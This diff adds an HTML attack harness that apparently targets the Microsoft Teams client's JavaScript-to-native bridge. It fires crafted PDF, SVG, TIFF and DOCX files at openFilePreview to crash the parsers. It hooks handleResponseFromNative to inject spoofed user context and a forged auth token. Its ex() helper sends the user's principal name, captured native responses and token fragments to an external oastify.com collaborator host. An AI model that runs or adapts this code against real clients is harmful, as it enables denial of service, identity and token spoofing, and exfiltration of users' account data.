@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FilePreview Crash</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','SF Mono',monospace; background:#0d1117; color:#c9d1d9; padding:6px; font-size:10px; }
+  #out { background:#161b22; padding:6px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:60vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  .section { margin:4px 0 2px; padding:3px; background:#21262d; border-radius:4px; }
+  .section b { color:#f85149; font-size:11px; }
+  button { background:#21262d; color:#f85149; border:1px solid #f85149; padding:6px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:10px; font-weight:bold; }
+  button.safe { color:#3fb950; border-color:#3fb950; }
+  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(140px, 1fr)); gap:3px; margin:3px 0; }
+  .status { font-size:9px; padding:2px 4px; background:#21262d; border-radius:3px; margin-top:3px; }
+</style>
+</head>
+<body>
+
+<div class="section"><b>TEST 18 — openFilePreview CRASH / PARSER BUG TESTING</b></div>
+
+<div class="grid">
+  <button onclick="runAll()">RUN ALL (2s delay)</button>
+  <button onclick="runPDFs()">PDFs ONLY</button>
+  <button onclick="runSVGs()">SVGs ONLY</button>
+  <button onclick="runOther()">TIFF/DOCX/HTML</button>
+</div>
+
+<div class="section"><b>Individual Tests — PDF Parsers</b></div>
+<div class="grid">
+  <button onclick="sendFile(0)">1. xref</button>
+  <button onclick="sendFile(1)">2. stream</button>
+  <button onclick="sendFile(2)">3. font/CMap</button>
+  <button onclick="sendFile(3)">4. recurse</button>
+  <button onclick="sendFile(4)">5. huge dims</button>
+  <button onclick="sendFile(5)">6. JBIG2</button>
+  <button onclick="sendFile(6)">7. CCITT Fax</button>
+</div>
+
+<div class="section"><b>Individual Tests — Image/Doc Parsers</b></div>
+<div class="grid">
+  <button onclick="sendFile(7)">8. TIFF IFD</button>
+  <button onclick="sendFile(8)">9. DOCX/OLE</button>
+</div>
+
+<div class="section"><b>Individual Tests — SVG Parsers</b></div>
+<div class="grid">
+  <button onclick="sendFile(9)">10. deep nest</button>
+  <button onclick="sendFile(10)">11. filter chain</button>
+  <button onclick="sendFile(11)">12. use recurse</button>
+</div>
+
+<div class="section"><b>Individual Tests — MIME Confusion</b></div>
+<div class="grid">
+  <button onclick="sendFile(12)">13. HTML→PDF</button>
+  <button onclick="sendFile(13)">14. HTML→SVG</button>
+  <button onclick="sendFile(14)">15. SVG→PDF</button>
+</div>
+
+<div class="section"><b>fileOpenPreference Variants</b></div>
+<div class="grid">
+  <button onclick="sendWithPref(0, 0)">xref pref=0</button>
+  <button onclick="sendWithPref(0, 1)">xref pref=1</button>
+  <button onclick="sendWithPref(0, 2)">xref pref=2</button>
+  <button onclick="sendWithPref(0, 3)">xref pref=3</button>
+</div>
+
+<div class="section"><b>Response Spoof (correct 2-arg format)</b></div>
+<div class="grid">
+  <button class="safe" onclick="spoofGetContext()">SPOOF getContext</button>
+  <button class="safe" onclick="spoofGetAuthToken()">SPOOF getAuthToken</button>
+  <button class="safe" onclick="dumpFormat()">DUMP format</button>
+</div>
+
+<div>
+  <button onclick="copyOut()">COPY</button>
+  <button onclick="el.textContent=''">CLEAR</button>
+</div>
+
+<div id="out" style="margin-top:4px;"></div>
+
+<script>
+var el = document.getElementById('out');
+var C = 'u836hcro9tvtgy6noymetbl9k0qreh26.oastify.com';
+var BASE = 'https://pedrojuniorrd.github.io/_layouts/crash-files';
+var NI = null;
+var origFPM = null;
+var origHandleResponse = null;
+var msgId = 1000;
+var capturedNativeFormats = [];
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function ex(path, data) {
+  var p = Object.keys(data).map(function(k) {
+    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 500));
+  }).join('&');
+  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
+    new Image().src = 'https://' + C + '/' + path + '?' + p;
+  });
+}
+
+function copyOut() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+// ================================================================
+// FILE DEFINITIONS
+// ================================================================
+var FILES = [
+  // PDF parser targets (0-6)
+  { name: 'crash-xref.pdf',        type: 'pdf',  title: 'Report-Q4.pdf',       desc: 'Quarterly Report',   size: 330 },
+  { name: 'crash-stream.pdf',      type: 'pdf',  title: 'Financials.pdf',      desc: 'Financial Report',   size: 701 },
+  { name: 'crash-font.pdf',        type: 'pdf',  title: 'Memo.pdf',            desc: 'Internal Memo',      size: 1490 },
+  { name: 'crash-recurse.pdf',     type: 'pdf',  title: 'Handbook.pdf',        desc: 'Employee Handbook',  size: 516 },
+  { name: 'crash-huge.pdf',        type: 'pdf',  title: 'Blueprint.pdf',       desc: 'Architecture Docs',  size: 658 },
+  { name: 'crash-jbig2.pdf',       type: 'pdf',  title: 'Scanned-Doc.pdf',     desc: 'Scanned Document',   size: 806 },
+  { name: 'crash-ccitt.pdf',       type: 'pdf',  title: 'Fax-Receipt.pdf',     desc: 'Fax Document',       size: 811 },
+
+  // Image/Doc parser targets (7-8)
+  { name: 'crash-ifd.tiff',        type: 'tiff', title: 'Photo.tiff',          desc: 'Team Photo',         size: 512 },
+  { name: 'crash-ole.docx',        type: 'docx', title: 'Meeting-Notes.docx',  desc: 'Meeting Notes',      size: 26179 },
+
+  // SVG parser targets (9-11)
+  { name: 'crash-deep-nest.svg',   type: 'svg',  title: 'Diagram.svg',         desc: 'Architecture Diagram', size: 630134 },
+  { name: 'crash-filter.svg',      type: 'svg',  title: 'Logo.svg',            desc: 'Company Logo',       size: 49069 },
+  { name: 'crash-use-recurse.svg', type: 'svg',  title: 'Flowchart.svg',       desc: 'Process Flow',       size: 422 },
+
+  // MIME confusion targets (12-14)
+  { name: 'crash-mismatch.html',   type: 'pdf',  title: 'Report.pdf',          desc: 'HTML as PDF',        size: 110329 },
+  { name: 'crash-mismatch.html',   type: 'svg',  title: 'Diagram.svg',         desc: 'HTML as SVG',        size: 110329 },
+  { name: 'crash-filter.svg',      type: 'pdf',  title: 'Chart.pdf',           desc: 'SVG as PDF',         size: 49069 }
+];
+
+// ================================================================
+// BRIDGE SEND
+// ================================================================
+function bridgeSend(func, args) {
+  var id = msgId++;
+  var request = { id: id, func: func, args: args || [], timestamp: Date.now(), apiVersionTag: 'v2_' + func };
+  if (NI && NI.framelessPostMessage) {
+    try {
+      NI.framelessPostMessage(JSON.stringify(request));
+      return id;
+    } catch(e) {
+      log('bridgeSend error: ' + e.message, 'fail');
+    }
+  }
+  return null;
+}
+
+// ================================================================
+// SEND FILE TO openFilePreview
+// ================================================================
+function sendFile(idx) {
+  return sendFileWithPref(idx, 0);
+}
+
+function sendWithPref(idx, pref) {
+  return sendFileWithPref(idx, pref);
+}
+
+function sendFileWithPref(idx, fileOpenPref) {
+  var f = FILES[idx];
+  if (!f) { log('Invalid file index: ' + idx, 'fail'); return; }
+
+  var url = BASE + '/' + f.name;
+  var entityId = 't18-' + idx + '-pref' + fileOpenPref + '-' + Date.now();
+
+  log('\n[' + (idx+1) + '] ' + f.name + ' → type=' + f.type + ' pref=' + fileOpenPref, 'warn');
+  log('  url: ' + url, 'info');
+
+  var params = [
+    entityId,
+    f.title,
+    f.desc,
+    f.type,
+    url,                 // objectUrl
+    url,                 // downloadUrl
+    url,                 // webPreviewUrl
+    '',                  // webEditUrl
+    '',                  // baseUrl
+    false,               // editFile
+    '',                  // subEntityId
+    'view',              // viewerAction
+    fileOpenPref,        // fileOpenPreference (0=QuickLook, 1=inline, 2=download, 3=external)
+    '',                  // conversationId
+    f.size,              // sizeInBytes
+    '',                  // title2?
+    '',                  // unknown
+    '',                  // unknown
+    '',                  // unknown
+    ''                   // unknown
+  ];
+
+  var id = bridgeSend('openFilePreview', params);
+
+  if (id !== null) {
+    log('  sent id=' + id, 'ok');
+    ex('t18-sent', {
+      file: f.name,
+      type: f.type,
+      pref: fileOpenPref,
+      idx: idx,
+      id: id,
+      url: url
+    });
+  } else {
+    log('  FAILED to send', 'fail');
+  }
+}
+
+// ================================================================
+// BATCH RUNS
+// ================================================================
+function runSequence(indices, delay) {
+  delay = delay || 2000;
+  var i = 0;
+  function next() {
+    if (i >= indices.length) {
+      log('\n=== Batch complete (' + indices.length + ' files) ===', 'ok');
+      ex('t18-batch-done', { count: indices.length, indices: indices.join(',') });
+      return;
+    }
+    sendFile(indices[i]);
+    i++;
+    setTimeout(next, delay);
+  }
+  next();
+}
+
+function runAll() {
+  log('\n' + '='.repeat(60), 'crit');
+  log('RUNNING ALL ' + FILES.length + ' FILES (2s delay between each)', 'crit');
+  log('Watch for app crash after each send!', 'warn');
+  log('='.repeat(60), 'crit');
+  var all = [];
+  for (var i = 0; i < FILES.length; i++) all.push(i);
+  runSequence(all, 2000);
+}
+
+function runPDFs() {
+  log('\n=== PDF Parser Tests ===', 'crit');
+  runSequence([0, 1, 2, 3, 4, 5, 6], 2000);
+}
+
+function runSVGs() {
+  log('\n=== SVG Parser Tests ===', 'crit');
+  runSequence([9, 10, 11], 2000);
+}
+
+function runOther() {
+  log('\n=== TIFF/DOCX/MIME Tests ===', 'crit');
+  runSequence([7, 8, 12, 13, 14], 2000);
+}
+
+// ================================================================
+// HOOK: Capture native bridge + response format
+// ================================================================
+if (window.nativeInterface) {
+  NI = window.nativeInterface;
+  origFPM = NI.framelessPostMessage;
+  origHandleResponse = NI.handleResponseFromNative;
+
+  NI.handleResponseFromNative = function() {
+    var rawArgs = Array.from(arguments);
+    var rawStr = rawArgs[0];
+    var rawType = typeof rawStr;
+    var parsedType = null;
+    try {
+      var parsed = JSON.parse(rawStr);
+      parsedType = Array.isArray(parsed) ? 'array[' + parsed.length + ']' : typeof parsed;
+    } catch(e) {
+      parsedType = 'parse-error';
+    }
+
+    capturedNativeFormats.push({
+      raw: rawStr,
+      rawType: rawType,
+      parsedType: parsedType,
+      argCount: rawArgs.length,
+      allArgs: rawArgs
+    });
+
+    log('[NATIVE→SDK] args=' + rawArgs.length + ' type=' + rawType +
+      ' parsed=' + parsedType + ' | ' + String(rawStr).substring(0, 100), 'crit');
+
+    ex('t18-native-response', {
+      argCount: rawArgs.length,
+      rawType: rawType,
+      parsedType: parsedType,
+      preview: String(rawStr).substring(0, 200)
+    });
+
+    if (origHandleResponse) return origHandleResponse.apply(this, arguments);
+  };
+
+  log('NI hooked — handleResponseFromNative intercepted', 'ok');
+}
+
+// ================================================================
+// SDK INIT
+// ================================================================
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+  (async function() {
+    try {
+      await microsoftTeams.app.initialize();
+      var ctx = await microsoftTeams.app.getContext();
+      log('SDK OK: ' + ctx.user.userPrincipalName + ' | ' + ctx.app.host.clientType, 'ok');
+      log('NI: ' + (NI ? Object.getOwnPropertyNames(NI).length + ' props' : 'MISSING'), NI ? 'ok' : 'fail');
+      log('Captured ' + capturedNativeFormats.length + ' init responses', 'info');
+      log('Files configured: ' + FILES.length, 'info');
+      log('Base URL: ' + BASE, 'info');
+      log('\nReady — run tests individually or batch.', 'ok');
+      log('After each send, watch if Teams crashes.', 'warn');
+      log('If crash: Settings > Privacy > Analytics > "Teams"', 'warn');
+
+      ex('t18-init', {
+        user: ctx.user.userPrincipalName,
+        host: ctx.app.host.clientType,
+        ni: !!NI,
+        files: FILES.length,
+        initResponses: capturedNativeFormats.length
+      });
+    } catch(e) {
+      log('SDK init error: ' + e.message, 'fail');
+      log('Trying bridgeSend directly...', 'warn');
+      if (NI) {
+        log('NI available — can still send openFilePreview', 'ok');
+      }
+    }
+  })();
+};
+document.head.appendChild(sdkScript);
+
+
+// ================================================================
+// RESPONSE SPOOF — correct 2-arg format discovered in test17
+//
+// Native format: handleResponseFromNative(data_string, id_string)
+//   - arg[0]: raw string (sometimes base64, sometimes plain)
+//   - arg[1]: request ID as string
+//
+// The SDK internally does:
+//   1. Look up callback by id (arg[1])
+//   2. Pass data (arg[0]) to the callback
+//
+// We must:
+//   1. Block the SDK request (DROP framelessPostMessage)
+//   2. Capture the request ID
+//   3. Call origHandleResponse with (fakeData, capturedId) as 2 args
+// ================================================================
+
+function spoofGetContext() {
+  log('\n' + '='.repeat(60), 'info');
+  log('SPOOF getContext — 2-arg format (test17 discovery)', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI || !origHandleResponse) { log('No NI or no origHandleResponse', 'fail'); return; }
+
+  var fakeUPN = 'SPOOFED-VICTIM@attacker-controlled.com';
+  var capturedId = null;
+  var _origFPM = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func === 'getContext' && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getContext id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          var fakeContext = {
+            teamId: '19:SPOOFED@thread.tacv2',
+            entityId: '',
+            userPrincipalName: fakeUPN,
+            channelType: 'Regular',
+            teamType: 0,
+            teamSiteDomain: 'attacker-controlled.sharepoint.com',
+            isTeamArchived: false,
+            channelId: '19:SPOOFED-CHANNEL@thread.tacv2',
+            channelName: 'ATTACKER-SPOOFED-CHANNEL',
+            tid: 'FAKE-TENANT-AAAA-BBBB-CCCCCCCCCCCC',
+            groupId: 'FAKE-GROUP-1111-2222-333333333333',
+            hostClientType: 'ios',
+            userObjectId: 'FAKE-USER-OBJ-ID',
+            userLicenseType: 'Enterprise',
+            teamName: 'ATTACKER-SPOOFED-TEAM',
+            locale: 'en-us',
+            theme: 'default',
+            sessionId: 'SPOOFED-SESSION-ID',
+            ringId: 'ring0',
+            appSessionId: 'SPOOFED-APP-SESSION',
+            isCallingAllowed: true,
+            isPSTNCallingAllowed: true,
+            meetingId: '',
+            chatId: '',
+            isMultiWindow: false,
+            appIconPosition: 0,
+            userClickTime: Date.now(),
+            userFileOpenPreference: 0
+          };
+
+          // FORMAT A: 2 separate args — data as raw base64, id as string
+          var dataB64 = btoa(JSON.stringify(fakeContext));
+          log('Trying FORMAT A: origHandleResponse(base64_data, id_string)', 'warn');
+          try {
+            origHandleResponse.call(NI, dataB64, String(capturedId));
+            log('  FORMAT A: no error!', 'crit');
+            ex('t18-spoof-a-ok', { id: capturedId, format: '2arg-b64' });
+          } catch(e) {
+            log('  FORMAT A error: ' + e.message, 'fail');
+            ex('t18-spoof-a-err', { err: e.message, id: capturedId });
+
+            // FORMAT B: 2 args — data as plain JSON string, id as string
+            log('Trying FORMAT B: origHandleResponse(json_string, id_string)', 'warn');
+            try {
+              origHandleResponse.call(NI, JSON.stringify(fakeContext), String(capturedId));
+              log('  FORMAT B: no error!', 'crit');
+              ex('t18-spoof-b-ok', { id: capturedId, format: '2arg-json' });
+            } catch(e2) {
+              log('  FORMAT B error: ' + e2.message, 'fail');
+              ex('t18-spoof-b-err', { err: e2.message });
+
+              // FORMAT C: 1 arg — JSON array [data, id]
+              log('Trying FORMAT C: origHandleResponse(JSON.stringify([data, id]))', 'warn');
+              try {
+                origHandleResponse.call(NI, JSON.stringify([dataB64, String(capturedId)]));
+                log('  FORMAT C: no error!', 'crit');
+                ex('t18-spoof-c-ok', { id: capturedId, format: '1arg-array' });
+              } catch(e3) {
+                log('  FORMAT C error: ' + e3.message, 'fail');
+                ex('t18-spoof-c-err', { err: e3.message });
+              }
+            }
+          }
+
+          // Also try postSdkResponseWithId
+          log('Trying postSdkResponseWithId...', 'warn');
+          try {
+            NI.postSdkResponseWithId(String(capturedId), JSON.stringify([null, JSON.stringify(fakeContext)]));
+            log('  postSdkResponseWithId: no error!', 'crit');
+            ex('t18-spoof-psdri-ok', { id: capturedId });
+          } catch(e) {
+            log('  postSdkResponseWithId: ' + e.message, 'fail');
+          }
+
+          // Try sdkEncodedResponseHandler
+          log('Trying sdkEncodedResponseHandler...', 'warn');
+          try {
+            NI.sdkEncodedResponseHandler(JSON.stringify({id: parseInt(capturedId), args: [null, JSON.stringify(fakeContext)]}));
+            log('  sdkEncodedResponseHandler: no error!', 'crit');
+            ex('t18-spoof-serh-ok', { id: capturedId });
+          } catch(e) {
+            log('  sdkEncodedResponseHandler: ' + e.message, 'fail');
+          }
+
+        }, 30);
+
+        return; // DROP — block native send
+      }
+    } catch(e) {}
+    return _origFPM.apply(this, arguments);
+  };
+
+  // Call getContext — SDK will try to send to native, we block + inject
+  microsoftTeams.app.getContext().then(function(ctx) {
+    log('\n*** getContext() RESOLVED ***', 'crit');
+    log('  UPN: ' + (ctx.user ? ctx.user.userPrincipalName : 'N/A'), 'crit');
+    log('  tenant: ' + (ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A'), 'crit');
+    log('  team: ' + (ctx.team ? ctx.team.displayName : 'N/A'), 'crit');
+    log('  channel: ' + (ctx.channel ? ctx.channel.displayName : 'N/A'), 'crit');
+
+    var isSpoofed = ctx.user && String(ctx.user.userPrincipalName).indexOf('SPOOFED') !== -1;
+    if (isSpoofed) {
+      log('\n!!! SPOOF CONFIRMED — SDK GOT FAKE DATA !!!', 'crit');
+      ex('t18-SPOOF-CONFIRMED-CONTEXT', {
+        upn: ctx.user.userPrincipalName,
+        tenantId: ctx.user.tenant ? ctx.user.tenant.id : 'N/A',
+        team: ctx.team ? ctx.team.displayName : 'N/A'
+      });
+    } else {
+      log('SDK returned real context — spoof format still wrong', 'warn');
+      ex('t18-spoof-failed-context', { upn: ctx.user ? ctx.user.userPrincipalName : 'none' });
+    }
+
+    NI.framelessPostMessage = _origFPM;
+  }).catch(function(e) {
+    log('getContext error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _origFPM;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _origFPM; }, 10000);
+}
+
+
+function spoofGetAuthToken() {
+  log('\n' + '='.repeat(60), 'info');
+  log('SPOOF getAuthToken — 2-arg format', 'info');
+  log('='.repeat(60), 'info');
+
+  if (!NI || !origHandleResponse) { log('No NI or no origHandleResponse', 'fail'); return; }
+
+  var fakeToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC9mYWtlLyIsInN1YiI6ImZha2Utc3ViIiwidXBuIjoiYXR0YWNrZXJAZXZpbC5jb20iLCJzY3AiOiJVc2VyLlJlYWQgTWFpbC5SZWFkIiwiZXhwIjo5OTk5OTk5OTk5fQ.FAKE-SIGNATURE-FOR-TESTING';
+  var capturedId = null;
+  var _origFPM = NI.framelessPostMessage;
+
+  NI.framelessPostMessage = function(msg) {
+    try {
+      var parsed = JSON.parse(msg);
+      if (parsed.func && parsed.func.indexOf('getAuthToken') !== -1 && !capturedId) {
+        capturedId = parsed.id;
+        log('BLOCKED getAuthToken id=' + capturedId, 'crit');
+
+        setTimeout(function() {
+          // FORMAT A: 2 args — token as raw string, id as string
+          log('Trying FORMAT A: (raw_token, id)', 'warn');
+          try {
+            origHandleResponse.call(NI, fakeToken, String(capturedId));
+            log('  FORMAT A: no error!', 'crit');
+            ex('t18-auth-a-ok', { id: capturedId });
+          } catch(e) {
+            log('  FORMAT A: ' + e.message, 'fail');
+
+            // FORMAT B: 2 args — base64(token), id
+            log('Trying FORMAT B: (base64_token, id)', 'warn');
+            try {
+              origHandleResponse.call(NI, btoa(fakeToken), String(capturedId));
+              log('  FORMAT B: no error!', 'crit');
+              ex('t18-auth-b-ok', { id: capturedId });
+            } catch(e2) {
+              log('  FORMAT B: ' + e2.message, 'fail');
+
+              // FORMAT C: 2 args — JSON.stringify([null, token]), id
+              log('Trying FORMAT C: (JSON([null,token]), id)', 'warn');
+              try {
+                origHandleResponse.call(NI, JSON.stringify([null, fakeToken]), String(capturedId));
+                log('  FORMAT C: no error!', 'crit');
+                ex('t18-auth-c-ok', { id: capturedId });
+              } catch(e3) {
+                log('  FORMAT C: ' + e3.message, 'fail');
+              }
+            }
+          }
+
+          // postSdkResponseWithId
+          try {
+            NI.postSdkResponseWithId(String(capturedId), JSON.stringify([null, fakeToken]));
+            log('  postSdkResponseWithId: no error!', 'crit');
+            ex('t18-auth-psdri-ok', { id: capturedId });
+          } catch(e) {
+            log('  postSdkResponseWithId: ' + e.message, 'fail');
+          }
+
+          // postSdkResponseWithFunc
+          try {
+            NI.postSdkResponseWithFunc('authentication.getAuthToken', JSON.stringify([null, fakeToken]));
+            log('  postSdkResponseWithFunc: no error!', 'crit');
+            ex('t18-auth-psdrf-ok', { id: capturedId });
+          } catch(e) {
+            log('  postSdkResponseWithFunc: ' + e.message, 'fail');
+          }
+
+        }, 30);
+
+        return; // DROP
+      }
+    } catch(e) {}
+    return _origFPM.apply(this, arguments);
+  };
+
+  microsoftTeams.authentication.getAuthToken().then(function(token) {
+    log('\n*** getAuthToken() RESOLVED ***', 'crit');
+    log('  Token: ' + String(token).substring(0, 120) + '...', 'crit');
+
+    var isFake = String(token).indexOf('FAKE-SIGNATURE') !== -1 || String(token).indexOf('attacker@evil') !== -1;
+    if (isFake) {
+      log('\n!!! AUTH TOKEN SPOOF CONFIRMED !!!', 'crit');
+      log('SDK accepted attacker-controlled token!', 'crit');
+      ex('t18-AUTH-SPOOF-CONFIRMED', { token: String(token).substring(0, 200) });
+    } else {
+      log('SDK got real token — spoof format wrong', 'warn');
+      ex('t18-auth-spoof-failed', { token: String(token).substring(0, 100) });
+    }
+
+    NI.framelessPostMessage = _origFPM;
+  }).catch(function(e) {
+    log('getAuthToken error: ' + e.message, 'fail');
+    NI.framelessPostMessage = _origFPM;
+  });
+
+  setTimeout(function() { NI.framelessPostMessage = _origFPM; }, 10000);
+}
+
+
+// ================================================================
+// DUMP FORMAT — show exact native response format for analysis
+// ================================================================
+function dumpFormat() {
+  log('\n' + '='.repeat(60), 'info');
+  log('FORMAT DUMP — ' + capturedNativeFormats.length + ' captured responses', 'info');
+  log('='.repeat(60), 'info');
+
+  for (var i = 0; i < capturedNativeFormats.length; i++) {
+    var f = capturedNativeFormats[i];
+    log('\n--- Response #' + i + ' ---', 'info');
+    log('  argCount: ' + f.argCount, 'info');
+    log('  arg[0] typeof: ' + f.rawType, 'info');
+    log('  arg[0] raw (200ch): ' + String(f.raw).substring(0, 200), 'warn');
+    log('  JSON.parse result: ' + f.parsedType, 'info');
+
+    if (f.argCount > 1) {
+      for (var j = 1; j < f.allArgs.length; j++) {
+        log('  arg[' + j + '] typeof: ' + typeof f.allArgs[j] + ' val: ' + String(f.allArgs[j]).substring(0, 100), 'info');
+      }
+    }
+
+    // Try base64 decode on arg[0]
+    try {
+      var decoded = atob(String(f.raw));
+      log('  base64 decoded: ' + decoded.substring(0, 200), 'crit');
+    } catch(e) {
+      log('  not base64', 'info');
+    }
+
+    ex('t18-dump-' + i, {
+      argCount: f.argCount,
+      rawType: f.rawType,
+      parsedType: f.parsedType,
+      raw: String(f.raw).substring(0, 400),
+      arg1: f.allArgs.length > 1 ? String(f.allArgs[1]).substring(0, 100) : 'none'
+    });
+  }
+}
+
+</script>
+</body>
+</html>
